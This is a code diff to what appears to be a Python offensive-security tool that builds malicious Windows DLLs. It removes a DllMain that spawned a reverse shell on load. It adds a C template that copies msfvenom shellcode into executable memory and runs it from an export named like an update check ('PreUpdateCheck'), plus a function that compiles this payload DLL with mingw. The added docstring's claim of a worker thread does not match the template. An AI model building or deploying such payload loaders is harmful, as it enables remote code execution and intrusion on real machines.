@@ -40,19 +40,11 @@ __declspec(dllexport) int PreUpdateCheck(void) {
     return 1;
 }
 
-DWORD WINAPI worker(LPVOID unused) {
-    (void)unused;
-    revshell();
-    return 0;
-}
-
 BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
     (void)inst;
     (void)reserved;
-    if (reason == DLL_PROCESS_ATTACH) {
+    if (reason == DLL_PROCESS_ATTACH)
         DisableThreadLibraryCalls(inst);
-        CreateThread(NULL, 0, worker, NULL, 0, NULL);
-    }
     return TRUE;
 }
 """
@@ -116,6 +108,29 @@ BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
 """
 
 _DEFAULT_ENROLL_SCRIPT = "enroll.ps1"
+
+_MINGW_SHELLCODE_DLL_C = r"""
+#include <windows.h>
+#include <string.h>
+
+static unsigned char sc[] = { {SHELLCODE} };
+
+__declspec(dllexport) int {EXPORT}(void) {
+    void *mem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) return 0;
+    memcpy(mem, sc, sizeof(sc));
+    ((void (*)(void))mem)();
+    return 1;
+}
+
+BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
+    (void)inst;
+    (void)reserved;
+    if (reason == DLL_PROCESS_ATTACH)
+        DisableThreadLibraryCalls(inst);
+    return TRUE;
+}
+"""
 
 
 _MINGW_GCC = {
@@ -193,6 +208,49 @@ def build_reverse_shell_dll_mingw(
             detail = (proc.stderr or proc.stdout or "").strip()
             raise RuntimeError(f"mingw DLL build failed: {detail or proc.returncode}")
     print_success(f"payload DLL → {out_path} ({out_path.stat().st_size} bytes, mingw-{arch})")
+    return out_path
+
+
+def build_reverse_shell_dll_msfvenom_export(
+    *,
+    shellcode: bytes,
+    out_path: Path,
+    arch: TargetArch = "x86",
+    export_name: str = "PreUpdateCheck",
+) -> Path:
+    """mingw DLL exporting ``export_name``; runs msfvenom shellcode in a worker thread."""
+    gcc = ensure_mingw_gcc(arch)
+    out_path.parent.mkdir(parents=True, exist_ok=True)
+    sc_literal = ", ".join(f"0x{b:02x}" for b in shellcode)
+    source = (
+        _MINGW_SHELLCODE_DLL_C.replace("{SHELLCODE}", sc_literal).replace("{EXPORT}", export_name)
+    )
+    with tempfile.TemporaryDirectory(prefix="admapper-msf-dll-") as tmp:
+        src = Path(tmp) / "payload.c"
+        def_file = Path(tmp) / "payload.def"
+        src.write_text(source, encoding="utf-8")
+        def_file.write_text(
+            f"LIBRARY {out_path.stem}\nEXPORTS\n{export_name}\n",
+            encoding="utf-8",
+        )
+        cmd = [
+            gcc,
+            "-shared",
+            "-o",
+            str(out_path),
+            str(src),
+            str(def_file),
+            "-O2",
+            "-s",
+        ]
+        print_info(f"wrapping msfvenom shellcode as {export_name} export ({arch}) …")
+        proc = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=120)
+        if proc.returncode != 0 or not out_path.is_file():
+            detail = (proc.stderr or proc.stdout or "").strip()
+            raise RuntimeError(f"msfvenom export DLL build failed: {detail or proc.returncode}")
+    print_success(
+        f"payload DLL → {out_path} ({out_path.stat().st_size} bytes, msfvenom+{export_name})"
+    )
     return out_path
 
 
